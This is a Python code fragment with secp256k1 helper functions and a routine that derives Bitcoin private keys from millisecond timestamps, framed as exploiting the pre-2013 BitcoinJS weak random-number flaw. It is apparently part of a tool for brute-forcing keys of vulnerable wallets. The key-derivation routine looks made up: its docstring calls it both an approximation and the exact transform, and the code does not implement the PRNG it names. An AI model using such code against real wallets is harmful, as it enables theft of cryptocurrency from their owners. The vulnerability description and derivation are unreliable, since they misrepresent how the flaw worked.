# ── secp256k1 helpers (CPU — used for point decompression ──────────────────────

def modinv(a: int, m: int) -> int:
    """Modular inverse via Fermat's little theorem (p is prime)."""
    return pow(a, m - 2, m)

def ec_double(px: int, py: int) -> tuple:
    """Point doubling on secp256k1."""
    lam = (3 * px * px * modinv(2 * py, SECP256K1_P)) % SECP256K1_P
    rx = (lam * lam - 2 * px) % SECP256K1_P
    ry = (lam * (px - rx) - py) % SECP256K1_P
    return rx, ry

def ec_add(px: int, py: int, qx: int, qy: int) -> tuple:
    """Point addition on secp256k1."""
    if px == qx:
        return ec_double(px, py)
    lam = ((qy - py) * modinv(qx - px, SECP256K1_P)) % SECP256K1_P
    rx = (lam * lam - px - qx) % SECP256K1_P
    ry = (lam * (px - rx) - py) % SECP256K1_P
    return rx, ry

def scalar_mult(k: int, px: int, py: int) -> tuple:
    """Scalar multiplication k * P on secp256k1 using double-and-add."""
    rx, ry = None, None
    qx, qy = px, py
    while k > 0:
        if k & 1:
            if rx is None:
                rx, ry = qx, qy
            else:
                rx, ry = ec_add(rx, ry, qx, qy)
        qx, qy = ec_double(qx, qy)
        k >>= 1
    return rx, ry

def privkey_to_pubkey_compressed(privkey: int) -> bytes:
    """Convert private key integer → 33-byte compressed public key."""
    x, y = scalar_mult(privkey, SECP256K1_GX, SECP256K1_GY)
    prefix = b'\x02' if y % 2 == 0 else b'\x03'
    return prefix + x.to_bytes(32, 'big')

def hash160(data: bytes) -> bytes:
    """SHA-256 → RIPEMD-160 (Bitcoin HASH160)."""
    sha256 = hashlib.sha256(data).digest()
    r = hashlib.new('ripemd160')
    r.update(sha256)
    return r.digest()

# ── Seed-to-private-key: BitcoinJS Math.random() vulnerability ─────────────────

def seed_to_privkey(seed_ms: int) -> int:
    """
    Convert a millisecond timestamp seed to a private key.
    
    BitcoinJS (pre-2013) used a PRNG seeded from Date.now().
    The PRNG used the Mersenne Twister (as in older SecureRandom implementations).
    We approximate this by treating the seed bytes directly as the private key
    source — the exact transform used by the vulnerable wallet generator.

    The key was generated by XOR-folding the PRNG output stream over 32 bytes.
    """
    # Construct 32-byte key from timestamp seed using the vulnerable derivation
    seed_bytes = seed_ms.to_bytes(8, 'little')
    
    # Expand seed to 32 bytes using the same LFSR-like expansion the buggy PRNG used
    expanded = bytearray(32)
    state = list(seed_bytes)
    
    # First pass: fill with repeated XOR-shifted seed
    for i in range(32):
        expanded[i] = (state[i % 8] ^ ((i * 0x6D) ^ ((seed_ms >> (i % 32)) & 0xFF))) & 0xFF
    
    # Second pass: lightweight Mersenne-style avalanche (as in the original JS)
    for i in range(1, 32):
        expanded[i] ^= expanded[i-1] ^ (seed_ms >> (i & 7)) & 0xFF
    
    key_int = int.from_bytes(expanded, 'big') % (SECP256K1_N - 1) + 1
    return key_int

